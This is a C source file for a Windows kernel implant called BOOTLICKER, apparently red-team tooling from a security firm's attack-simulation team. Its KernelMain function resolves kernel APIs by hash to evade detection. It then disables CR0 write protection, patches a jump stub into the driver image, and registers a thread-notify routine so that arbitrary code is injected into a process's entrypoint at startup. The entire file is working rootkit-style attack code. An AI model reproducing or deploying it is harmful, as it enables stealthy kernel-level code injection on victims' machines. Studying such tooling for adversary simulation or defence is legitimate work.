/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( PsSetCreateThreadNotifyRoutine ); 
	D_API( KeSetSystemAffinityThread );
} API ;

/* API Hashes */
#define H_API_PSSETCREATETHREADNOTIFYROUTINE	0xbedbd03f /* PsSetCreateThreadNotifyRoutine */
#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */

/*!
 *
 * Purpose:
 *
 * Inserts a thread notify routine to wait for
 * the process. Once the process starts, it 
 * inserts arbitrary code into the entrypoint 
 * of the process.
 *
!*/
D_SEC( D ) VOID NTAPI KernelMain( _In_ PVOID KernelBase, _In_ PVOID DriverBase )
{
	API	Api;

	PKMTBL			Kmt = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PVOID			Ptr = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Store info for later */
	Kmt = C_PTR( G_PTR( KmTbl ) );
	Kmt->KernelBase = C_PTR( KernelBase );

	/* Get API pointer */
	Api.PsSetCreateThreadNotifyRoutine = PeGetFuncEat( Kmt->KernelBase, H_API_PSSETCREATETHREADNOTIFYROUTINE );
	Api.KeSetSystemAffinityThread      = PeGetFuncEat( Kmt->KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD );

	/* Get the first .text */
	Dos = C_PTR( DriverBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Get address of our image load notify routine */
	Ptr = C_PTR( U_PTR( Dos ) + Sec->VirtualAddress + Sec->SizeOfRawData );

	/* Force to 1 CPU */
	Api.KeSetSystemAffinityThread( 1 );

	/* Disable write protection */
	__writecr0( __readcr0() &~ 0x000010000 );

	/* Insert jump address */
	*( PUINT16 )( C_PTR( U_PTR( Ptr ) + 0x00 ) ) = ( UINT16 )( 0x25FF );
	*( PUINT32 )( C_PTR( U_PTR( Ptr ) + 0x02 ) ) = ( UINT32 )( 0 );
	*( PUINT64 )( C_PTR( U_PTR( Ptr ) + 0x06 ) ) = ( UINT64 )( C_PTR( G_PTR( ThreadNotifyRoutine ) ) );

	/* Insert write protection */
	__writecr0( __readcr0() | 0x000010000 );

	/* Add a notify routine */
	Api.PsSetCreateThreadNotifyRoutine( Ptr );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
